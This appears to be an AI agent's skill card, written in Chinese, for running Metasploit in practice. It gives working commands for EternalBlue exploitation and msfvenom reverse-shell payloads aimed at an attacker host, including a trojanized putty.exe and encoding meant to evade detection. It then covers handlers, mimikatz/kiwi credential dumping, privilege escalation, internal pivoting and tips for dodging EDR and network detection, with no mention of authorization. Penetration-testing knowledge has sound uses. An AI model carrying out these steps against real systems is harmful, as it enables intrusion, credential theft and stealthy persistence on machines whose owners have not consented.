---
name: metasploit-framework-ops
description: "Use when 用 Metasploit/msfvenom 打点或做 handler 时。"
version: 1.0.0
created_by: agent
---

# Metasploit 实战运维

本库无 msf 专卡前的旁路缺口:**模块搜索→配置→payload→handler→会话后渗透→代理链**。命令均为 msf6 标准用法。

## 触发场景

- 要跑 msf 模块、生成 payload、做 handler 监听、开代理链进内网
- 要验已知 CVE(MS17-010/Log4Shell/CVE 类模块)的可利用性
- 需要把 msf 会话接管进后渗透(提权/凭据/横向)

## 一、起底:数据库与工作区(必做,否则结果不落库)

```bash
msfdb init && msfdb run          # 首次初始化并进入控制台(也可 msfdb start + msfconsole)
msfconsole -q                    # 静默启动
msfconsole -q -r hits.rc         # 用 resource 脚本自动跑(无交互)
```

```msf
workspace -a tgt1                # 每个目标一个工作区,不混数据
db_nmap -sV -Pn -p- 10.0.0.5     # 扫描结果直接入库
hosts ; services ; vulns         # 看库
search type:exploit platform:windows smb      # 搜索
search cve:2021-44228            # 按 CVE 搜
use exploit/windows/smb/ms17_010_eternalblue
show options ; check ; run
run -j -z                        # 后台跑,不自动开会话
```

## 二、payload 生成(msfvenom)

```bash
# 通用模板: msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <fmt> -o <file>
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f exe -o s.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp    LHOST=10.0.0.1 LPORT=4444 -f elf -o s.elf
msfvenom -p php/meterpreter/reverse_tcp          LHOST=10.0.0.1 LPORT=4444 -f raw -o s.php
msfvenom -p java/jsp_shell_reverse_tcp           LHOST=10.0.0.1 LPORT=4444 -f raw -o s.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.0.0.1 LPORT=4444 -f psh-reflection -o s.ps1
msfvenom -p windows/x64/shell_reverse_tcp        LHOST=10.0.0.1 LPORT=4444 -f exe-only -o s.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.0.0.1 LPORT=4444 -e x64/xor_dynamic -i 5 -b '\x00' -f exe -o enc.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.0.0.1 LPORT=4444 -x putty.exe -k -f exe -o putty_x.exe
msfvenom --list payloads | grep windows/x64/meterpreter   # 列可用 payload
```

**staged vs stageless**:`.../meterpreter/reverse_tcp` = 分段(小、需二次拉取,易被拦);`.../meterpreter_reverse_tcp`(**无斜杠分隔**) = 无阶段(大、稳、过 NDR 概率高)。目标有 EDR 时先走 `edr-bypass-re`,本卡 payload 属裸产物。

## 三、handler 与 resource 自动化

```msf
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false          # 不死:继续收后面来的会话
set EnableStageEncoding true     # 分段编码,降静态特征
exploit -j                       # 后台跑
jobs                             # 看监听
```

`hits.rc` 一次性会话脚本(存盘后 `msfconsole -q -r hits.rc`):

```msf
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
exploit -j -z
sleep 5
sessions -l
```

自动化接口:`msfrpcd -P <pwd> -S -a 127.0.0.1 -p 55553`(RPC 免进控制台;Python 用 `pymetasploit3`)。控制台内 `makerc out.rc` 可把本回合命令存成脚本。

## 四、会话与后渗透(meterpreter)

```msf
sessions -l ; sessions -i 1      # 列表/进入
```

```msf
background ; sysinfo ; getuid ; getprivs
migrate <pid>                    # 先迁到稳定/受信任进程再动手
load kiwi ; creds_all            # 凭据(kiwi=旧 mimikatz 载入名)
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_domain
run post/windows/gather/checkvm
shell                            # 落到原生 cmd
elevate ; getsystem              # 提权(高特征,EDR 环境慎用)
```

内网代理链(从已控主机转发/开 sock):

```msf
route add 10.10.0.0/16 <session_id>      # 让 msf 模块走该会话打内网
use auxiliary/server/socks_proxy ; set SRVPORT 1080 ; run -j
run autoroute -p                         # 查看已加路由
portfwd add -l 3389 -p 3389 -r 10.10.0.7 # 单端口转发
```

`proxychains nmap -sT -Pn 10.10.0.7` 配合 socks 进内网;另两种链路走 `internal-tunnel`(chisel/frp/ligolo)。

## 五、Pitfalls

| 坑 | 处理 |
|---|---|
| 会话秒掉 | 先 `set ExitOnSession false`;staged 改 stageless;端口换 443/80 |
| `getsystem`/`kiwi` 被杀 | 先 `migrate` 到 `spoolsv.exe`/`explorer.exe`;高特征手法改走 `edr-bypass-re` |
| 内网打不到 | 忘了 `route add`(或加了但没 `run autoroute -p` 验证) |
| 结果散乱无法复盘 | 没建 workspace / 没用 `db_nmap`,数据不入库 |
| 默认 certificate 不验 | 生产对抗时 `set HandlerSSLCert` + `set StagerVerifySSLCert true` |
| 端口 4444/31337 指纹 | 换 443/8443,与业务流量同质 |

## 参考文件

| 文件 | 内容 |
|---|---|
| `references/upstream-metasploit.md` | 上游 7KB 全文:基础操作/搜索/完整利用流程/后渗透模块清单 |

来源: https://github.com/Hi-FullHouse/CyberSecurity-Skills (MIT) 03-漏洞利用模块,原文落地。

## 交接

`exploit-attack` · `exploit-dev`(自写 exp) · `edr-bypass-re`(免杀) · `internal-tunnel` · `host-c2-verify` · `post-exploit`。

